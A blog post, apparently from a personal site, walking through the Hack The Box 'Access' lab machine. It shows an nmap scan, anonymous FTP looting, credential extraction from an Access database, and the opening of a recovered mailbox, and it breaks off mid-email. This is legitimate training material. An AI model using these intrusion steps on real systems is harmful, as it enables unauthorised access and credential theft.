<!doctype html><html xmlns=http://www.w3.org/1999/xhtml xml:lang=en lang=en-us><head><meta name=generator content="Hugo 0.119.0"><link href=http://gmpg.org/xfn/11 rel=profile><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>Jamie Magee &#183; Jamie Magee</title><link rel=preload href=/css/poole.css as=style><link rel=preload href=/css/hyde.css as=style><link rel=preload href=/css/poole-overrides.css as=style><link rel=preload href=/css/hyde-overrides.css as=style><link rel=preload href=/css/hyde-x.css as=style><link rel=preload href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface" as=font><link rel=preload href=https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css as=style><link rel=stylesheet href=/css/poole.css><link rel=stylesheet href=/css/hyde.css><link rel=stylesheet href=/css/poole-overrides.css><link rel=stylesheet href=/css/hyde-overrides.css><link rel=stylesheet href=/css/hyde-x.css><link rel=stylesheet href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface"><link rel=stylesheet href=https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css><style>@font-face{font-family:berkeley mono;src:url(/fonts/BerkeleyMono-Regular.woff2)format('woff2')}</style><link rel=stylesheet href=/css/jamie.css><link rel=apple-touch-icon-precomposed sizes=144x144 href=/apple-touch-icon-144-precomposed.png><link href=/favicon.ico rel=icon><link rel=alternate type=application/rss+xml href=/index.xml title="Jamie Magee"><meta name=description content><meta name=keywords content><meta property="og:title" content="Jamie Magee"><meta property="og:description" content><meta property="og:type" content="website"><meta property="og:url" content="/"><meta name=twitter:card content="summary"><meta name=twitter:title content="Jamie Magee"><meta name=twitter:description content></head><body class=theme-base-0c><div class=sidebar><div class="container sidebar-sticky"><div class=sidebar-about><div class=sidebar-head><h1><a href=/>Jamie Magee</a></h1></div><p class=lead>Programmer, Engineer, Problem Solver</p></div><ul class=sidebar-nav><li class=sidebar-nav-item><a href=/>Home</a></li><li class=sidebar-nav-item><a href=/about>About</a></li><li class=sidebar-nav-item><a href=/blog>Archive</a></li></ul><ul class=sidebar-nav><li class=sidebar-nav-item><a href=https://github.com/JamieMagee><i class="fa fa-github-square fa-3x"></i></a>
<a href=https://www.linkedin.com/in/jamiemagee1/><i class="fa fa-linkedin-square fa-3x"></i></a>
<a href=http://twitter.com/Jamie_Magee><i class="fa fa-twitter-square fa-3x"></i></a></li></ul><p>&copy; 2023. <a href=https://creativecommons.org/licenses/by-nc/4.0/>CC BY-NC 4.0</a></p></div></div><div class="content container"><div class=posts><div class=post><h1 class=post-title><a href=/blog/access-htb-writeup/>Access: Hack The Box writeup</a></h1><span class=post-date>Mar 2, 2019 &#183; 8 minute read &#183; <a href=/blog/access-htb-writeup/#disqus_thread>Comments</a></span><p><a href=https://www.hackthebox.eu/home/machines/profile/156><img src=/img/access-info.png alt="Access info page"></a></p><p>Recently I discovered <a href=https://www.hackthebox.eu/home>Hack The Box</a>, an online platform to hone your cyber security skills by practising on vulnerable VMs. The first box I solved is called <a href=https://www.hackthebox.eu/home/machines/profile/156>Access</a>. In this blog post I&rsquo;ll walk through how I solved it. If you don&rsquo;t want any spoilers, look away now!</p><h2 id=information-gathering>Information gathering</h2><p>Let&rsquo;s start with an <code>nmap</code> scan to see what services are running on the box.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-shell data-lang=shell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#998;font-style:italic># nmap -n -v -Pn -p- -A --reason -oN nmap.txt 10.10.10.98</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>...
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>PORT   STATE SERVICE REASON  VERSION
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>21/tcp open  ftp     syn-ack Microsoft ftpd
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>| ftp-anon: Anonymous FTP login allowed <span style=color:#000;font-weight:700>(</span>FTP code 230<span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>|_Can<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>t get directory listing: TIMEOUT
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>| ftp-syst:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>|_  SYST: Windows_NT
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>23/tcp open  telnet  syn-ack Microsoft Windows XP telnetd <span style=color:#000;font-weight:700>(</span>no more connections allowed<span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>80/tcp open  http    syn-ack Microsoft IIS httpd 7.5
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>| http-methods:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>|   Supported Methods: OPTIONS TRACE GET HEAD POST
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>|_  Potentially risky methods: TRACE
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>|_http-server-header: Microsoft-IIS/7.5
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>|_http-title: MegaCorp
</span></span></code></pre></div><p><code>nmap</code> has found three services running: FTP, telnet, and an HTTP server. Let&rsquo;s see what&rsquo;s running on the HTTP server.</p><p><img src=/img/htb-access-http.png alt></p><p>It&rsquo;s just a static page, showing an image. Nothing interesting, so let&rsquo;s move on for now.</p><h2 id=anonymous-ftp>Anonymous FTP</h2><p><code>nmap</code> showed that there is an FTP server running, with anonymous login allowed. Let&rsquo;s see what&rsquo;s on that server</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-shell data-lang=shell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#998;font-style:italic># ftp 10.10.10.98</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>Connected to 10.10.10.98.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#099>220</span> Microsoft FTP Service
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>Name <span style=color:#000;font-weight:700>(</span>10.10.10.98:root<span style=color:#000;font-weight:700>)</span>: anonymous
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#099>331</span> Anonymous access allowed, send identity <span style=color:#000;font-weight:700>(</span>e-mail name<span style=color:#000;font-weight:700>)</span> as password.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>Password:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#099>230</span> User logged in.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>Remote system <span style=color:#0086b3>type</span> is Windows_NT.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>ftp&gt; ls
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#099>200</span> PORT <span style=color:#0086b3>command</span> successful.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#099>125</span> Data connection already open; Transfer starting.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>08-23-18  08:16PM       &lt;DIR&gt;          Backups
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>08-24-18  09:00PM       &lt;DIR&gt;          Engineer
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#099>226</span> Transfer complete.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>ftp&gt; ls Backups
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#099>200</span> PORT <span style=color:#0086b3>command</span> successful.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#099>125</span> Data connection already open; Transfer starting.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>08-23-18  08:16PM              <span style=color:#099>5652480</span> backup.mdb
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span><span style=color:#099>226</span> Transfer complete.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>ftp&gt; ls Engineer
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span><span style=color:#099>200</span> PORT <span style=color:#0086b3>command</span> successful.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#099>125</span> Data connection already open; Transfer starting.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>08-24-18  12:16AM                <span style=color:#099>10870</span> Access Control.zip
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span><span style=color:#099>226</span> Transfer complete.
</span></span></code></pre></div><p>There are some interesting files here, let&rsquo;s download them and analyse them</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-shell data-lang=shell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#998;font-style:italic># wget ftp://anonymous:anonymous@10.10.10.98 --no-passive-ftp --mirror</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>--2019-02-02 15:37:26--  ftp://anonymous:*password*@10.10.10.98/
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>           <span style=color:#000;font-weight:700>=</span>&gt; ‘10.10.10.98/.listing’
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>Connecting to 10.10.10.98:21... connected.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span>Logging in as anonymous ... Logged in!
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6</span><span>...
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7</span><span>FINISHED --2019-02-02 15:37:28--
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">8</span><span>Total wall clock time: 1.8s
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">9</span><span>Downloaded: <span style=color:#099>5</span> files, 5.4M in 1.4s <span style=color:#000;font-weight:700>(</span>3.99 MB/s<span style=color:#000;font-weight:700>)</span>
</span></span></code></pre></div><h2 id=microsoft-access>Microsoft Access</h2><p>We&rsquo;ve got a <code>.mdb</code> file—which is a Microsoft Access database file—and a zip file. If we take a quick look at the zip file it&rsquo;s password protected. We&rsquo;ll have to come back the that later.</p><p>We can examine <code>backup.mdb</code> using MDB tools. Maybe there&rsquo;s something we can use there.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-shell data-lang=shell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#998;font-style:italic># mdb-tables Backups/backup.mdb</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos acc_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc auth_group_permissions auth_message auth_permission auth_user auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTemp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL operatecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSINFO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantmsg worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics acc_levelset_emp acc_morecardset ACUnlockComb AttParam auth_group AUTHDEVICE base_option dbapp_viewmodel FingerVein devlog HOLIDAYS personnel_issuecard SystemLog USER_TEMP_SCH UserUsedSClasses acc_monitor_log OfflinePermitGroups OfflinePermitUsers OfflinePermitDoors LossCard TmpPermitGroups TmpPermitUsers TmpPermitDoors ParamSet acc_reader acc_auxiliary STD_WiegandFmt CustomReport ReportField BioTemplate FaceTempEx FingerVeinEx TEMPLATEEx
</span></span></code></pre></div><p>It looks like there&rsquo;s a lot of autogenerated tables here, but those <code>auth_*</code> tables look interesting.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-shell data-lang=shell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#998;font-style:italic># mdb-export Backups/backup.mdb auth_user</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>id,username,password,Status,last_login,RoleID,Remark
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>25,<span style=color:#d14>&#34;admin&#34;</span>,<span style=color:#d14>&#34;admin&#34;</span>,1,<span style=color:#d14>&#34;08/23/18 21:11:47&#34;</span>,26,
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>27,<span style=color:#d14>&#34;engineer&#34;</span>,<span style=color:#d14>&#34;access4u@security&#34;</span>,1,<span style=color:#d14>&#34;08/23/18 21:13:36&#34;</span>,26,
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span>28,<span style=color:#d14>&#34;backup_admin&#34;</span>,<span style=color:#d14>&#34;admin&#34;</span>,1,<span style=color:#d14>&#34;08/23/18 21:14:02&#34;</span>,26,
</span></span></code></pre></div><p>Awesome! So we&rsquo;ve got some credentials for <code>engineer</code>, and we&rsquo;ve got a password protected zip file in the <code>Engineer</code> directory.</p><h2 id=microsoft-outlook>Microsoft Outlook</h2><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-shell data-lang=shell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#998;font-style:italic># 7z x Access\ Control.zip</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>7-Zip <span style=color:#000;font-weight:700>[</span>64<span style=color:#000;font-weight:700>]</span> 16.02 : Copyright <span style=color:#000;font-weight:700>(</span>c<span style=color:#000;font-weight:700>)</span> 1999-2016 Igor Pavlov : 2016-05-21
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>p7zip Version 16.02 <span style=color:#000;font-weight:700>(</span><span style=color:teal>locale</span><span style=color:#000;font-weight:700>=</span>en_GB.UTF-8,Utf16<span style=color:#000;font-weight:700>=</span>on,HugeFiles<span style=color:#000;font-weight:700>=</span>on,64 bits,2 CPUs Intel<span style=color:#000;font-weight:700>(</span>R<span style=color:#000;font-weight:700>)</span> Core<span style=color:#000;font-weight:700>(</span>TM<span style=color:#000;font-weight:700>)</span> i7-7820HQ CPU @ 2.90GHz <span style=color:#000;font-weight:700>(</span>906E9<span style=color:#000;font-weight:700>)</span>,ASM,AES-NI<span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>Scanning the drive <span style=color:#000;font-weight:700>for</span> archives:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#099>1</span> file, <span style=color:#099>10870</span> bytes <span style=color:#000;font-weight:700>(</span><span style=color:#099>11</span> KiB<span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>Extracting archive: Access Control.zip
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>--
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:teal>Path</span> <span style=color:#000;font-weight:700>=</span> Access Control.zip
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:teal>Type</span> <span style=color:#000;font-weight:700>=</span> zip
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>Physical <span style=color:teal>Size</span> <span style=color:#000;font-weight:700>=</span> <span style=color:#099>10870</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>Enter password <span style=color:#000;font-weight:700>(</span>will not be echoed<span style=color:#000;font-weight:700>)</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>Everything is Ok
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>Size:       <span style=color:#099>271360</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>Compressed: <span style=color:#099>10870</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#998;font-style:italic># ls</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span><span style=color:#d14>&#39;Access Control.pst&#39;</span>  <span style=color:#d14>&#39;Access Control.zip&#39;</span>
</span></span></code></pre></div><p>That worked! Now we&rsquo;ve got the mailbox backup for the engineer, but we first need to convert it to something that we can read more easily on Linux.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-shell data-lang=shell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#998;font-style:italic># readpst Access\ Control.pst</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>Opening PST file and indexes...
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>Processing Folder <span style=color:#d14>&#34;Deleted Items&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>	<span style=color:#d14>&#34;Access Control&#34;</span> - <span style=color:#099>2</span> items <span style=color:#000;font-weight:700>done</span>, <span style=color:#099>0</span> items skipped.
</span></span></code></pre></div><p>Let&rsquo;s take a peek at the engineer&rsquo;s mailbox</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-shell data-lang=shell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#998;font-style:italic># mail -f Access\ Control.mbox</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>mail version v14.9.11.  Type <span style=color:#d14>`</span>?<span style=color:#d14>&#39; for help
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#d14>&#39;</span>/root/10.10.10.98/Engineer/Access Control.mbox<span style=color:#d14>&#39;: 1 message
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#d14>▸O  1 john@megacorp.com  2018-08-23 23:44   87/3112  MegaCorp Access Control System &#34;security&#34; account
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#d14>?
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#d14>[-- Message  1 -- 87 lines, 3112 bytes --]:
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#d14>From &#34;john@megacorp.com&#34; Thu Aug 23 23:44:07 2018
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#d14>From: john@megacorp.com &lt;john@megacorp.com&gt;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#d14>Subject: MegaCorp Access Control System &#34;security&#34; account
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#d14>To: &#39;</span>security@accesscontrolsystems.com<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>Date: Thu, <span style=color:#099>23</span> Aug <span style=color:#099>2018</span> 23:44:07 +0000
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#000;font-weight:700>[</span>-- <span style=color:#998;font-style:italic>#1.1 73/2670 multipart/alternative --]</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#000;font-weight:700>[</span>-- <span style=color:#998;font-style:italic>#1.1.1 15/211 text/plain, 7bit, utf-8 --]</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>Hi there,
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>
